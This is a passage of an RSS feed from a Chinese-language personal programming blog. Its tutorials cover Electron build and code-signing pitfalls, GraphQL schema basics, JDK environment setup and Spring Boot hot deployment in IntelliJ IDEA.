<p>• publishing publisher=Github (owner: vxhly, project: demo, version: 0.0.1) • uploading file=demo-setup-0.0.1.exe.blockmap provider=GitHub • uploading file=demo-setup-0.0.1.exe provider=GitHub • skipped publishing file=demo-setup-0.0.1.exe.blockmap reason=release doesn't exist and not created because &quot;publish&quot; is not &quot;always&quot; and build is not on tag tag=v0.0.1 version=0.0.1 • skipped publishing file=demo-setup-0.0.1.exe reason=release doesn't exist and not created because &quot;publish&quot; is not &quot;always&quot; and build is not on tag tag=v0.0.1 version=0.0.1 • skipped publishing file=latest.yml reason=release doesn't exist and not created because &quot;publish&quot; is not &quot;always&quot; and build is not on tag tag=v0.0.1 version=0.0.1 Done in 128.39s. Updating build cache... Cache 'node_modules' - Updated Cache entry not found: C:\Users\appveyor\AppData\Roaming\npm-cache Cache 'C:\Users\appveyor.electron' - Updated Cache 'C:\Users\appveyor\AppData\Local\Yarn\cache' - Updated Build success</p>
</div>
<h3 id="解决方案-4" tabindex="-1"> 解决方案</h3>
<p>可能原因一：自带的 <code>npm run build</code> 这个脚本让 CI 去执行构建, 但是发现无法自动上传到 GitHub 的 release 里可能原因二：未发布 tag</p>
<p>步骤一：在 <code>package.json</code> 中配置运行 <code>script</code></p>
<div><pre><code><span>{</span>
  <span>"release"</span><span>:</span> <span>"node .electron-vue/build.js &amp;&amp; electron-builder"</span><span>,</span>
  <span>"patch"</span><span>:</span> <span>"npm version patch &amp;&amp; git push origin master &amp;&amp; git push origin --tags"</span><span>,</span>
  <span>"minor"</span><span>:</span> <span>"npm version minor &amp;&amp; git push origin master &amp;&amp; git push origin --tags"</span><span>,</span>
  <span>"major"</span><span>:</span> <span>"npm version major &amp;&amp; git push origin master &amp;&amp; git push origin --tags"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>步骤二：修改 <code>.travis.yml</code> 和 <code>appveyor.yml</code> 文件（PS：在坑四中已体现, 这边就不重复了）</p>
<h2 id="坑六" tabindex="-1"> 坑六</h2>
<p>在 Windows 下打包之后, 未能正确的显示安装路径而是直接安装</p>
<h3 id="解决方案-5" tabindex="-1"> 解决方案</h3>
<p>在 <code>package.json</code> 中修改</p>
<div><pre><code><span>{</span>
  <span>"build"</span><span>:</span> <span>{</span>
    <span>"win"</span><span>:</span> <span>{</span>
      <span>"icon"</span><span>:</span> <span>"build/icons/icon.ico"</span><span>,</span>
      <span>"target"</span><span>:</span> <span>[</span>
        <span>{</span>
          <span>"target"</span><span>:</span> <span>"nsis"</span><span>,</span>
          <span>"arch"</span><span>:</span> <span>[</span><span>"ia32"</span><span>]</span>
        <span>}</span>
      <span>]</span>
    <span>}</span><span>,</span>
    <span>"nsis"</span><span>:</span> <span>{</span>
      <span>"oneClick"</span><span>:</span> <span>false</span><span>,</span>
      <span>"allowElevation"</span><span>:</span> <span>true</span><span>,</span>
      <span>"allowToChangeInstallationDirectory"</span><span>:</span> <span>true</span><span>,</span>
      <span>"installerIcon"</span><span>:</span> <span>"build/icons/icon.ico"</span><span>,</span>
      <span>"uninstallerIcon"</span><span>:</span> <span>"build/icons/icon.ico"</span><span>,</span>
      <span>"installerHeaderIcon"</span><span>:</span> <span>"build/icons/icon.ico"</span><span>,</span>
      <span>"createDesktopShortcut"</span><span>:</span> <span>true</span><span>,</span>
      <span>"createStartMenuShortcut"</span><span>:</span> <span>true</span><span>,</span>
      <span>"displayLanguageSelector"</span><span>:</span> <span>true</span><span>,</span>
      <span>"multiLanguageInstaller"</span><span>:</span> <span>true</span><span>,</span>
      <span>"installerLanguages"</span><span>:</span> <span>[</span><span>"en_US"</span><span>,</span> <span>"zh_CN"</span><span>]</span><span>,</span>
      <span>"warningsAsErrors"</span><span>:</span> <span>false</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="坑七" tabindex="-1"> 坑七</h2>
<p><code>MacOS</code> 下打包未能正确识别到签名证书, 报错特征</p>
<div><p>报错特征</p>
<p>• electron-builder version=21.2.0 os=19.0.0 • loaded configuration file=package.json (&quot;build&quot; field) • writing effective config file=build/builder-effective-config.yaml • rebuilding native dependencies dependencies=grpc@1.24.2 platform=darwin arch=x64 • rebuilding native dependency name=grpc version=1.24.2 • packaging platform=darwin arch=x64 electron=2.0.18 appOutDir=build/mac • skipped macOS application code signing reason=cannot find valid &quot;Developer ID Application&quot; identity or custom non-Apple code signing certificate, see https://electron.build/code-signing allIdentities=</p>
<pre><code>                                               0 identities found

                                            Valid identities only
                                               0 valid identities found
</code></pre>
</div>
<h3 id="解决方案-6" tabindex="-1"> 解决方案</h3>
<p>使用 <code>X-code</code> 进行 mac 版本上代码签名</p>
<ol>
<li>打开 xcode 主界面</li>
<li>Xcode==&gt;Preferences…</li>
</ol>
<p><img src="/assets/electron-1.png" alt="electron-mac"></p>
<ol start="3">
<li>Accounts==&gt;Apple IDs==&gt;Manage Certificates…, 如果没有登录的话, 先登录 Apple ID, 注意一定要登录开发者账号。登录成功后再进行 Manage Certificates；</li>
</ol>
<p><img src="/assets/electron-2.png" alt="electron-mac"></p>
<ol start="4">
<li>添加“+”Developer ID Application,注意一定要添加 Developer ID Application 到钥匙串中, 不要选错了。</li>
</ol>
<p><img src="/assets/electron-3.png" alt="electron-mac"></p>
<ol start="5">
<li>成功添加到钥匙串我的证书中, 经过以上的步骤可以成功添加一个证书到钥匙串中的我的证书中。</li>
</ol>
<p><img src="/assets/electron-4.png" alt="electron-mac"></p>
<p><img src="/assets/electron-5.png" alt="electron-mac"></p>
<ol start="6">
<li>正确签名之后, 打包成功！</li>
</ol>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/electron-1.png" type="image/png"/>
    </item>
    <item>
      <title>graphql 学习</title>
      <link>https://vxhly.github.io/views/graphql/learn-graphql.html</link>
      <guid>https://vxhly.github.io/views/graphql/learn-graphql.html</guid>
      <source url="https://vxhly.github.io/rss.xml">graphql 学习</source>
      <description>前言
记录 graphql 的学习笔记.

</description>
      <category>graphql</category>
      <pubDate>Fri, 11 Jun 2021 15:41:21 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>记录 graphql 的学习笔记.</p>
</div>

<h2 id="简介" tabindex="-1"> 简介</h2>
<h2 id="schema-包含的类型" tabindex="-1"> Schema 包含的类型</h2>
<ul>
<li>
<p><code>Scalar types</code></p>
<div><p>提示</p>
<ul>
<li>下面的数据类型类似于我们平常使用的编程语言中的原始类型。</li>
<li>需要定义非空类型时, 需要添加 <code>!</code>, 例如：<code>Int!</code></li>
</ul>
</div>
<ul>
<li><code>Int</code>：有符号 32 位整数。</li>
<li><code>Float</code>：有符号双精度浮点值。</li>
<li><code>String</code>：UTF‐8 字符序列。</li>
<li><code>Boolean</code>： true 或者 false 。</li>
<li><code>ID</code>：ID 标量类型表示一个唯一标识符, 通常用以重新获取对象或者作为缓存中的键。ID 类型使用和 String 一样的方式序列化；然而将其定义为 ID 意味着并不需要人类可读型。</li>
</ul>
</li>
<li>
<p><code>Object types</code></p>
<div><p>提示</p>
<p>一个对象类型包含一组字段, 每个字段可以是标量类型或另一种对象类型。</p>
</div>
<div><pre><code><span>type</span> <span>Book</span> <span>{</span>
  <span>title</span><span>:</span> <span>String</span>
  <span>author</span><span>:</span> <span>Author</span>
<span>}</span>

<span>type</span> <span>Author</span> <span>{</span>
  <span>name</span><span>:</span> <span>String</span>
  <span>books</span><span>:</span> <span>[</span><span>Book</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div></li>
<li>
<p><code>The Query type</code></p>
<div><p>提示</p>
<ul>
<li>定义客户端可以针对您的数据图执行哪些 GraphQL 读取操作。</li>
<li>Query 类型的每个字段定义了不同支持查询的名称和返回类型。</li>
</ul>
</div>
<div><pre><code><span>type</span> <span>Query</span> <span>{</span>
  <span>getBooks</span><span>:</span> <span>[</span><span>Book</span><span>]</span> <span># => 当前 API 为 /api/books</span>
  <span>getAuthors</span><span>:</span> <span>[</span><span>Author</span><span>]</span> <span># => 当前 API 为 /api/authors</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>执行查询一</p>
</div>
<div><pre><code><span>qurty</span> <span>{</span>
  <span>getBooks</span> <span>{</span>
    <span>title</span>
  <span>}</span>

  <span>getAuthors</span> <span>{</span>
    <span>name</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>=&gt; 返回</p>
<div><pre><code><span>{</span>
  <span>"data"</span><span>:</span> <span>{</span>
    <span>"getBooks"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"title"</span><span>:</span> <span>""</span>
        <span>// ......</span>
      <span>}</span>
    <span>]</span><span>,</span>

    <span>"getAuthors"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"nmae"</span><span>:</span> <span>""</span>
        <span>// ......</span>
      <span>}</span>
    <span>]</span>

    <span>// ......</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>执行查询二</p>
</div>
<div><pre><code><span>qurty</span> <span>{</span>
  <span>getBooks</span> <span>{</span>
    <span>title</span>
    <span>author</span> <span>{</span>
      <span>name</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>=&gt; 返回</p>
<div><pre><code><span>{</span>
  <span>"data"</span><span>:</span> <span>{</span>
    <span>"getBooks"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"title"</span><span>:</span> <span>""</span><span>,</span>
        <span>"author"</span><span>:</span> <span>{</span>
          <span>"name"</span><span>:</span> <span>""</span>
        <span>}</span>
        <span>// ......</span>
      <span>}</span>
    <span>]</span>

    <span>// ......</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div></li>
<li>
<p><code>The Mutation type</code></p>
<div><p>提示</p>
<ul>
<li>定义支持的写操作。</li>
<li>Mutation 类型的每个字段定义了不同突变的签名和返回类型。</li>
</ul>
</div>
<div><pre><code><span>type</span> <span>Mutation</span> <span>{</span>
  <span>addBook</span><span>(</span><span>title</span><span>:</span> <span>String</span><span>,</span> <span>author</span><span>:</span> <span>String</span><span>)</span><span>:</span> <span>Book</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>执行添加</p>
</div>
<div><pre><code><span>mutation</span> <span>{</span>
  <span>addBook</span><span>(</span><span>title</span><span>:</span> <span>""</span><span>,</span> <span>author</span><span>:</span> <span>""</span><span>)</span> <span>{</span>
    <span>title</span>
    <span>author</span> <span>{</span>
      <span>name</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>=&gt; 返回</p>
<div><pre><code><span>{</span>
  <span>"data"</span><span>:</span> <span>{</span>
    <span>"addBook"</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>"title"</span><span>:</span> <span>""</span><span>,</span>
        <span>"author"</span><span>:</span> <span>{</span>
          <span>"name"</span><span>:</span> <span>""</span>
        <span>}</span>
        <span>// ......</span>
      <span>}</span>
    <span>]</span>

    <span>// ......</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div></li>
<li>
<p><code>Input type</code></p>
<div><p>提示</p>
<ul>
<li>允许您将对象作为参数传递给的特殊对象类型进行查询和突变。</li>
<li>帮助保持操作签名清洁。</li>
</ul>
</div>
<div><pre><code><span>type</span> <span>Mutation</span> <span>{</span>
  <span>createPost</span><span>(</span><span>title</span><span>:</span> <span>String</span><span>,</span> <span>body</span><span>:</span> <span>String</span><span>,</span> <span>mediaUrls</span><span>:</span> <span>[</span><span>String</span><span>]</span><span>)</span><span>:</span> <span>Post</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>输入类型</p>
</div>
<div><pre><code><span>type</span> <span>Mutation</span> <span>{</span>
  <span>createPost</span><span>(</span><span>post</span><span>:</span> <span>PostAndMediaInput</span><span>)</span><span>:</span> <span>Post</span>
<span>}</span>

<span>input</span> <span>PostAndMediaInput</span> <span>{</span>
  <span>title</span><span>:</span> <span>String</span>
  <span>body</span><span>:</span> <span>String</span>
  <span>mediaUrls</span><span>:</span> <span>[</span><span>String</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>JDK 的安装和环境变量的配置</title>
      <link>https://vxhly.github.io/views/java/install-jdk-on-windows.html</link>
      <guid>https://vxhly.github.io/views/java/install-jdk-on-windows.html</guid>
      <source url="https://vxhly.github.io/rss.xml">JDK 的安装和环境变量的配置</source>
      <description>前言
JDK 是 Java 语言的软件开发工具包, 主要用于移动设备、嵌入式设备上的 java 应用程序。JDK 是整个 java 开发的核心, 它包含了 JAVA 的运行环境, JAVA 工具和 JAVA 基础的类库。这里将介绍在 Windows 下 JDK 的安装和环境变量的配置。

</description>
      <category>java</category>
      <pubDate>Fri, 30 Sep 2016 19:36:02 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>JDK 是 Java 语言的软件开发工具包, 主要用于移动设备、嵌入式设备上的 java 应用程序。JDK 是整个 java 开发的核心, 它包含了 JAVA 的运行环境, JAVA 工具和 JAVA 基础的类库。这里将介绍在 Windows 下 JDK 的安装和环境变量的配置。</p>
</div>

<h2 id="安装-jdk" tabindex="-1"> 安装 JDK</h2>
<p>安装 JDK 时。第一次是安装 jdk , 第二次是安装 jre 。建议两个都安装在同一个 java 文件夹中的不同文件夹中。（不能都安装在 java 文件夹的根目录下, jdk 和 jre 安装在同一文件夹会出错）。</p>
<p><code>For Example:</code> <br></p>
<p><img src="/assets/jdk-1.png" alt="JDK 安装"></p>
<p>安装 <code>jdk</code> 随意选择目录 只需把默认安装目录 <code>\java</code> 之前的目录修改即可<br></p>
<p><img src="/assets/jdk-2.png" alt="JDK 安装"></p>
<p>安装 <code>jre</code> → <code>更改</code> → <code>\java</code> 之前目录和安装 <code>jdk</code> 目录相同即可<br></p>
<p><img src="/assets/jdk-3.png" alt="JDK 安装"></p>
<div><p>注意</p>
<p>若无安装目录要求, 可全默认设置。无需做任何修改, 两次均直接点下一步。</p>
</div>
<h2 id="环境变量配置" tabindex="-1"> 环境变量配置</h2>
<p>安装完 JDK 后配置环境变量, 依次选择: <code>计算机</code> → <code>属性</code> → <code>高级系统设置</code> → <code>高级</code> → <code>环境变量</code> <br></p>
<p><img src="/assets/jdk-4.png" alt="JDK 环境变量配置"></p>
<h3 id="指定-java-程序目录" tabindex="-1"> 指定 JAVA 程序目录</h3>
<p>新建 <code>JAVA_HOME</code> 变量 。变量值填写 <code>jdk</code> 的安装目录（本人是 <code>D:\Java\jdk</code> )<br></p>
<p><img src="/assets/jdk-5.png" alt="JDK 环境变量配置"></p>
<h3 id="修改-path-变量" tabindex="-1"> 修改 Path 变量</h3>
<p>在变量值最后输入 <code>%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</code> （注意原来 <code>Path</code> 的变量值末尾有没有 <code>;</code> 号, 如果没有, 先输入 <code>;</code> 号再输入上面的代码）<br></p>
<p><img src="/assets/jdk-6.png" alt="JDK 环境变量配置"></p>
<h3 id="新建-classpath-变量" tabindex="-1"> 新建 CLASSPATH 变量</h3>
<p>在变量值中输入 <code>.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar</code> （注意最前面有一点）<br></p>
<p><img src="/assets/jdk-7.png" alt="JDK 环境变量配置"></p>
<p>到此系统的环境变量已经全部配置完毕。</p>
<h2 id="检验安装完成" tabindex="-1"> 检验安装完成</h2>
<p>运行 cmd 输入 <code>java -version</code> （java 和 -version 之间有空格）。 若如图所示, 显示版本信息, 则说明安装和配置成功。<br></p>
<p><img src="/assets/jdk-8.png" alt="JDK 环境变量配置"></p>
<h2 id="附加-liunx-下环境变量配置" tabindex="-1"> 附加 liunx 下环境变量配置</h2>
<p>安装包只需在官网下载源码安装包即可, 下载之后解压在 <code>~/java/jdk</code> 下即可</p>
<p>在 <code>/etc/profile</code> 和 <code>/etc/bash.bashrc</code> 下粘贴以下代码</p>
<div><pre><code><span>export</span> <span>JAVA_HOME</span><span>=~</span>/java/jdk
<span>export</span> <span><span>PATH</span></span><span>=</span><span>$JAVA_HOME</span>/bin:<span>$PATH</span>
<span>export</span> <span>CLASSPATH</span><span>=</span>.:<span>$JAVA_HOME</span>/lib/dt.jar:<span>$JAVA_HOME</span>/lib/tools.jar
<span>export</span> <span>JRE_HOME</span><span>=</span><span>$JAVA_HOME</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>之后分别运行 <code>source /etc/profile</code> 、 <code>source /etc/bash.bashrc</code> 来让配置生效</p>
<p>生效之后可以运行 <code>java -version</code> 来验证一下</p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/jdk-1.png" type="image/png"/>
    </item>
    <item>
      <title>在 IntelliJ IDEA 中配置 Spring Boot 项目的热部署</title>
      <link>https://vxhly.github.io/views/java/spring-boot-by-idea-hot-deploy.html</link>
      <guid>https://vxhly.github.io/views/java/spring-boot-by-idea-hot-deploy.html</guid>
      <source url="https://vxhly.github.io/rss.xml">在 IntelliJ IDEA 中配置 Spring Boot 项目的热部署</source>
      <description>前言
Spring Boot 是由 Pivotal 团队提供的全新框架, 其设计目的是用来简化新 Spring 应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置, 从而使开发人员不再需要定义样板化的配置。Spring Boot 的 Web 项目, 在每一次修改了 java 文件或者是 resource 的时候, 都必须去重启一下项目, 这样的话浪费了很多的时间, 实现了热部署, 在每一次作了修改之后, 都会自动的重启。

</description>
      <category>java</category>
      <pubDate>Wed, 22 Aug 2018 14:47:20 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Spring Boot 是由 Pivotal 团队提供的全新框架, 其设计目的是用来简化新 Spring 应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置, 从而使开发人员不再需要定义样板化的配置。Spring Boot 的 Web 项目, 在每一次修改了 java 文件或者是 resource 的时候, 都必须去重启一下项目, 这样的话浪费了很多的时间, 实现了热部署, 在每一次作了修改之后, 都会自动的重启。</p>
</div>

<h2 id="使用-intellij-idea-创建-spring-boot-项目" tabindex="-1"> 使用 IntelliJ IDEA 创建 Spring Boot 项目</h2>
<h3 id="新建-spring-initializr-项目" tabindex="-1"> 新建 Spring Initializr 项目</h3>
<p><img src="/assets/spring-boot-1.png" alt="Spring Boot"></p>
<h3 id="填写项目信息" tabindex="-1"> 填写项目信息</h3>
<p><img src="/assets/spring-boot-2.png" alt="Spring Boot"></p>
<h3 id="选择项目使用的技术" tabindex="-1"> 选择项目使用的技术</h3>
<p><img src="/assets/spring-boot-3.png" alt="Spring Boot"></p>
<h3 id="填写项目名称" tabindex="-1"> 填写项目名称</h3>
<p><img src="/assets/spring-boot-4.png" alt="Spring Boot"></p>
<h3 id="项目架构及依赖" tabindex="-1"> 项目架构及依赖</h3>
<p><img src="/assets/spring-boot-5.png" alt="Spring Boot"></p>
<h2 id="添加测试控制器" tabindex="-1"> 添加测试控制器</h2>
<p>找到入口的文件, 将其修改成如下所示</p>
<div><pre><code><span>package</span> <span>com<span>.</span>springboot<span>.</span>first</span><span>;</span>

<span>import</span> <span><span>org<span>.</span>springframework<span>.</span>boot<span>.</span></span><span>SpringApplication</span></span><span>;</span>
<span>import</span> <span><span>org<span>.</span>springframework<span>.</span>boot<span>.</span>autoconfigure<span>.</span></span><span>SpringBootApplication</span></span><span>;</span>
<span>import</span> <span><span>org<span>.</span>springframework<span>.</span>web<span>.</span>bind<span>.</span>annotation<span>.</span></span><span>RequestMapping</span></span><span>;</span>
<span>import</span> <span><span>org<span>.</span>springframework<span>.</span>web<span>.</span>bind<span>.</span>annotation<span>.</span></span><span>RestController</span></span><span>;</span>

<span>@RestController</span>
<span>@SpringBootApplication</span>
<span>public</span> <span>class</span> <span>FirstApplication</span> <span>{</span>

    <span>@RequestMapping</span><span>(</span><span>"/"</span><span>)</span>
    <span>String</span> <span>index</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>"Hello Spring Boot"</span><span>;</span>
    <span>}</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>SpringApplication</span><span>.</span><span>run</span><span>(</span><span>FirstApplication</span><span>.</span><span>class</span><span>,</span> args<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p><code>@SpringBootApplication</code> 是 Spring Boot 项目的核心注解, 主要目的是开启自动配置。main 方法是一个标准的 Java 应用的 main 方法, 主要作用是作为项目启动的入口。</p>
</div>
<h3 id="访问测试" tabindex="-1"> 访问测试</h3>
<p>运行项目, 把它当成一个 java 类运行就可以了</p>
<p><img src="/assets/spring-boot-6.png" alt="Spring Boot"></p>
<p>运行信息</p>
<p><img src="/assets/spring-boot-7.png" alt="Spring Boot"></p>
<p>浏览器访问</p>
<p><img src="/assets/spring-boot-8.png" alt="Spring Boot"></p>
<h2 id="intellij-idea-配置热部署" tabindex="-1"> IntelliJ IDEA 配置热部署</h2>
<h3 id="配置-pom-xml" tabindex="-1"> 配置 pom.xml</h3>
<p>引入热加载的插件</p>
<div><pre><code><span><span><span>&lt;</span>dependency</span><span>></span></span>
    <span><span><span>&lt;</span>groupId</span><span>></span></span>org.springframework.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>
    <span><span><span>&lt;</span>artifactId</span><span>></span></span>spring-boot-devtools<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
    <span><span><span>&lt;</span>optional</span><span>></span></span>true<span><span><span>&lt;/</span>optional</span><span>></span></span>
<span><span><span>&lt;/</span>dependency</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>project 中添加 spring-boot-maven-plugin, 主要在 eclipse 中起作用, idea 不需要加此配置, springboot 项目的话, 应该是有此配置, 加里面的内容即可。</p>
<div><pre><code><span><span><span>&lt;</span>build</span><span>></span></span>
    <span><span><span>&lt;</span>plugins</span><span>></span></span>
        <span><span><span>&lt;</span>plugin</span><span>></span></span>
            <span><span><span>&lt;</span>groupId</span><span>></span></span>org.springframework.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>
            <span><span><span>&lt;</span>artifactId</span><span>></span></span>spring-boot-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>
            <span><span><span>&lt;</span>configuration</span><span>></span></span>
                <span><span><span>&lt;</span>fork</span><span>></span></span>true<span><span><span>&lt;/</span>fork</span><span>></span></span>
            <span><span><span>&lt;/</span>configuration</span><span>></span></span>
        <span><span><span>&lt;/</span>plugin</span><span>></span></span>
    <span><span><span>&lt;/</span>plugins</span><span>></span></span>
<span><span><span>&lt;/</span>build</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="配置-maven-下载加速" tabindex="-1"> 配置 Maven 下载加速</h3>
<p>右键项目选中 maven 选项, 然后选择 &quot;open settings.xml&quot; 或者 &quot;create settings.xml&quot;, 然后把如下代码粘贴进去就可以了. 重启 IDE, 感受速度飞起来的感觉吧！！！</p>
<div><pre><code><span>&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span><span><span>&lt;</span>settings</span> <span>xmlns</span><span><span>=</span><span>"</span>http://maven.apache.org/SETTINGS/1.0.0<span>"</span></span>
          <span><span>xmlns:</span>xsi</span><span><span>=</span><span>"</span>http://www.w3.org/2001/XMLSchema-instance<span>"</span></span>
          <span><span>xsi:</span>schemaLocation</span><span><span>=</span><span>"</span>http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>mirrors</span><span>></span></span>
        <span>&lt;!-- mirror
         | Specifies a repository mirror site to use instead of a given repository. The repository that
         | this mirror serves has an ID that matches the mirrorOf element of this mirror. IDs are used
         | for inheritance and direct lookup purposes, and must be unique across the set of mirrors.
         |
        &lt;mirror>
          &lt;id>mirrorId&lt;/id>
          &lt;mirrorOf>repositoryId&lt;/mirrorOf>
          &lt;name>Human Readable Name for this Mirror.&lt;/name>
          &lt;url>http://my.repository.com/repo/path&lt;/url>
        &lt;/mirror>
         --></span>

        <span><span><span>&lt;</span>mirror</span><span>></span></span>
            <span><span><span>&lt;</span>id</span><span>></span></span>alimaven<span><span><span>&lt;/</span>id</span><span>></span></span>
            <span><span><span>&lt;</span>name</span><span>></span></span>aliyun maven<span><span><span>&lt;/</span>name</span><span>></span></span>
            <span><span><span>&lt;</span>url</span><span>></span></span>http://maven.aliyun.com/nexus/content/groups/public/<span><span><span>&lt;/</span>url</span><span>></span></span>
            <span><span><span>&lt;</span>mirrorOf</span><span>></span></span>central<span><span><span>&lt;/</span>mirrorOf</span><span>></span></span>
        <span><span><span>&lt;/</span>mirror</span><span>></span></span>

        <span><span><span>&lt;</span>mirror</span><span>></span></span>
            <span><span><span>&lt;</span>id</span><span>></span></span>uk<span><span><span>&lt;/</span>id</span><span>></span></span>
            <span><span><span>&lt;</span>mirrorOf</span><span>></span></span>central<span><span><span>&lt;/</span>mirrorOf</span><span>></span></span>
            <span><span><span>&lt;</span>name</span><span>></span></span>Human Readable Name for this Mirror.<span><span><span>&lt;/</span>name</span><span>></span></span>
            <span><span><span>&lt;</span>url</span><span>></span></span>http://uk.maven.org/maven2/<span><span><span>&lt;/</span>url</span><span>></span></span>
        <span><span><span>&lt;/</span>mirror</span><span>></span></span>

        <span><span><span>&lt;</span>mirror</span><span>></span></span>
            <span><span><span>&lt;</span>id</span><span>></span></span>CN<span><span><span>&lt;/</span>id</span><span>></span></span>
            <span><span><span>&lt;</span>name</span><span>></span></span>OSChina Central<span><span><span>&lt;/</span>name</span><span>></span></span>
            <span><span><span>&lt;</span>url</span><span>></span></span>http://maven.oschina.net/content/groups/public/<span><span><span>&lt;/</span>url</span><span>></span></span>
            <span><span><span>&lt;</span>mirrorOf</span><span>></span></span>central<span><span><span>&lt;/</span>mirrorOf</span><span>></span></span>
        <span><span><span>&lt;/</span>mirror</span><span>></span></span>

        <span><span><span>&lt;</span>mirror</span><span>></span></span>
            <span><span><span>&lt;</span>id</span><span>></span></span>nexus<span><span><span>&lt;/</span>id</span><span>></span></span>
            <span><span><span>&lt;</span>name</span><span>></span></span>internal nexus repository<span><span><span>&lt;/</span>name</span><span>></span></span>
            <span>&lt;!-- &lt;url>http://192.168.1.100:8081/nexus/content/groups/public/&lt;/url>--></span>
            <span><span><span>&lt;</span>url</span><span>></span></span>http://repo.maven.apache.org/maven2<span><span><span>&lt;/</span>url</span><span>></span></span>
            <span><span><span>&lt;</span>mirrorOf</span><span>></span></span>central<span><span><span>&lt;/</span>mirrorOf</span><span>></span></span>
        <span><span><span>&lt;/</span>mirror</span><span>></span></span>

    <span><span><span>&lt;/</span>mirrors</span><span>></span></span>
<span><span><span>&lt;/</span>settings</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="intellij-idea-相关配置" tabindex="-1"> IntelliJ IDEA 相关配置</h3>
<p>点击 file , Settings , Build , Execution, Deplment</p>
<p><img src="/assets/spring-boot-9.png" alt="Spring Boot"></p>
<p>然后记得 apply, ok</p>
<p>组合键: <code>Shift+ALT+Ctrl+/</code> , 选择&quot;Registry&quot;, 回车, 找到&quot;complier.automake.allow.when.app.running&quot;</p>
<p><img src="/assets/spring-boot-10.png" alt="Spring Boot"></p>
<p>到此全部配置完毕, 手动重启一次, 修改代码保持即可看到控制台在自动重启</p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/spring-boot-1.png" type="image/png"/>
    </item>
    <item>
      <title>Spring Boot 整合 Mybatis</title>
      <link>https://vxhly.github.io/views/java/spring-boot-integration-mybatis.html</link>
      <guid>https://vxhly.github.io/views/java/spring-boot-integration-mybatis.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Spring Boot 整合 Mybatis</source>
      <description>提示
